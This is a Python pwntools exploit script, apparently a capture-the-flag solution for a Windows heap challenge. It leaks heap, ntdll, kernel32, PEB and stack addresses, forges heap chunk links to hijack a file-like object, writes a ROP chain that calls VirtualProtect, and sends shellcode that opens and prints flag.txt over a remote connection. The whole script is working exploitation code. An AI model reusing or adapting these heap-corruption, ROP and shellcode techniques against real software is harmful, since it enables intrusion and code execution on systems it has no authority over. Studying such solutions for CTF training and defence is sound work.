from pwn import *
import time
import sys


def add(key, size, data):
    proc.sendlineafter(b'>>', b'1')
    proc.sendlineafter(b':', key)
    proc.sendlineafter(b':', f'{size}'.encode())
    proc.sendafter(b':', data)


def view(key):
    proc.sendlineafter(b'>>', b'2')
    proc.sendlineafter(b':', key)
    proc.recvuntil(b'Data:')


def remove(key):
    proc.sendlineafter(b'>>', b'3')
    proc.sendlineafter(b':', key)


def logout():
    proc.sendlineafter(b'>>', b'4')


def login(name, password):
    # login
    proc.sendlineafter(b'>>', b'1')
    proc.sendafter(b':', name)
    proc.sendafter(b':', password)


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    login(b'ddaa\n', b'phdphd\n')

    for i in range(19):
        add(f'LFH_{i}', 0x200, 'LFH')
    for i in range(0x10):
        add(f'fill_{i}', 0x200, 'LFH')
    remove('fill_0')
    add('fill_1', 0x60, 'AAAA')
    view('fill_1')
    # data + chunk header
    proc.recv(0x60 + 0x10)
    heap_base = u64(proc.recv(8)) & ~0xffff
    size = u64(proc.recv(8))
    next_node = proc.recvuntil(b'\x00')[:-1]
    log.info('heap: ' + hex(heap_base))
    lock = heap_base + 0x2c0

    def leak(addr):
        add(b'fill_1', 0x60, b'A' * 0x70 + p64(addr))
        view(next_node)
        return u64(proc.recv(8))
    
    ntdll = leak(lock) - 0x163d10
    log.info('ntdll: ' + hex(ntdll))
    # 00000000`00163d10

    program = leak(ntdll + 0x01652c8) - 0xf8
    log.info('program: ' + hex(program))

    peb = leak(ntdll + 0x1652e8) - 0x240
    log.info('peb: ' + hex(peb))

    stack = leak(peb + 0x1010)
    log.info('stack: ' + hex(stack))

    kernel32 = leak(program + 0x3000) - 0x22680
    log.info('kernel32: ' + hex(kernel32))

    process_parameter = leak(peb + 0x20)
    stdin = leak(process_parameter + 0x20)
    log.info('stdin:' + hex(stdin))

    stdout = leak(process_parameter + 0x28)
    log.info('stdout:' + hex(stdout))

    target = program + 0x1e38
    ret_addr = stack + 0x2000 + (0x100 * 8)
    found = False
    for i in range(0x1000 // 8):
        print(i, hex(ret_addr))
        if leak(ret_addr) == target:
            print('Found return address')
            found = True
            break
        ret_addr += 8
    assert found
    ret_addr -= 0x280

    add(b'A', 0x440, b'AAAA' * 8)
    add(b'A', 0x100, b'AAAA' * 8)
    add(b'B', 0x100, b'BBBB' * 8)
    add(b'C', 0x100, b'CCCC' * 8)
    add(b'D', 0x100, b'DDDD' * 8)
    remove(b'B')
    remove(b'D')
    view(b'A')
    proc.recv(0x100)
    fake_chunk_header = proc.recv(0x10)
    B_flink = u64(proc.recv(8))
    B_blink = u64(proc.recv(8))
    proc.recv(0x100 + 0x110)
    D_flink = u64(proc.recv(8))
    D_blink = u64(proc.recv(8))
    print(hex(B_flink), hex(B_blink))
    print(hex(D_flink), hex(D_blink))
    B_addr = D_blink
    pass_adr = program + 0x5648
    user_adr = program + 0x5620
    add(b'A', 0x100, b'A' * 0x100 + fake_chunk_header + p64(pass_adr + 0x10))
    logout()
    # B->fake2(pass)->fake1(user)
    fake2 = b'phdphd\x00'.ljust(8, b'\x00') + fake_chunk_header[8:]
    fake2 += p64(user_adr + 0x10) + p64(D_blink)
    fake1 = b'ddaa\x00'.ljust(8, b'\x00') + fake_chunk_header[8:]
    fake1 += p64(D_flink) + p64(pass_adr + 0x10)
    login(fake1, fake2)

    cnt = 0
    _ptr = 0
    _base = ret_addr
    flag = 0x2080
    fd = 0
    bufsize = 0x100+0x10
    obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)
    obj += p32(fd) + p32(0) + p64(bufsize) +p64(0)
    obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2

    add(b'BBBB', 0x100, obj)
    add(b'BSS', 0x100, b'S' * 0x10 + p64(B_addr))

    logout()
    input('a')
    login(b'aaaa', b'aaaa')

    pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fb30
    shellcode_addr = program + 0x5000

    readfile = kernel32 + 0x22680
    virtualprotect = kernel32 + 0x1b680
    buf = flat(pop_rdx_rcx_r8_r9_r10_r11, shellcode_addr)
    buf += flat(stdin, 0x100, shellcode_addr + 0x100, 10, 11, readfile)
    buf += flat(pop_rdx_rcx_r8_r9_r10_r11, 0x1000, shellcode_addr)
    buf += flat(0x40, ret_addr + 0x100 - 8, 0, 11)
    buf += flat(virtualprotect, shellcode_addr)
    proc.send(buf.ljust(0x100 - 8) + p64(0x4))

    writefile = kernel32 + 0x22770
    createfile = kernel32 + 0x222f0

    shellcode = f'''
        jmp readflag
    flag:
        pop r11
    createfile:
        mov qword ptr [rsp + 0x30], 0
        mov qword ptr [rsp + 0x28], 0x80
        mov qword ptr [rsp + 0x20], 3
        xor r9, r9
        mov r8, 1
        mov rdx, 0x80000000
        mov rcx, r11
        mov rax, {createfile}
        call rax
    readfile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, rax
        mov rax, {readfile}
        call rax
    writefile:
        mov qword ptr [rsp + 0x20], 0
        lea r9, [rsp + 0x200]
        mov r8, 0x100
        lea rdx, [rsp + 0x100]
        mov rcx, {stdout}
        mov rax, {writefile}
        call rax
    loop:
        jmp loop
    readflag:
        call flag
    '''
    shellcode = (asm(shellcode) + b'flag.txt\x00').ljust(0x100, b'\x90') 
    proc.send(shellcode)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc 192.168.9.1 4869'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['filename'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
